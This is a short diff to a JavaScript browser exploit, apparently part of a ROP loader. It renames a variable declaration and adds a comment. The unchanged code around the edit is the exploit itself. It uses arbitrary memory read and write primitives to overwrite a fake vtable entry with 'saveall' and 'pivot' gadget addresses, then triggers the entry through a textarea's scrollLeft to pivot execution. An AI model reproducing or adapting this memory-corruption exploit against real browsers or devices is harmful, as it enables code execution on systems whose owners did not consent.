@@ -1,4 +1,5 @@
 // Insert all the variables and the commands at top level into the "rop_loader" function
+// change "var bak" to "bak" in the second appearance in the functions "saveall" and "pivot"
 
 // Global variables
 
@@ -47,7 +48,7 @@ function saveall()
     tarea.scrollLeft = 0;
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1d8);
+    bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
     write_ptr_at(fake_vt_ptr+0x38, 0x1234);
     tarea.scrollLeft = 0;
@@ -71,7 +72,7 @@ function pivot(buf)
     tarea.scrollLeft = 0;
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1d8);
+    bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, pivot_addr);
     write_ptr_at(fake_vt_ptr+0x38, buf);
     write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
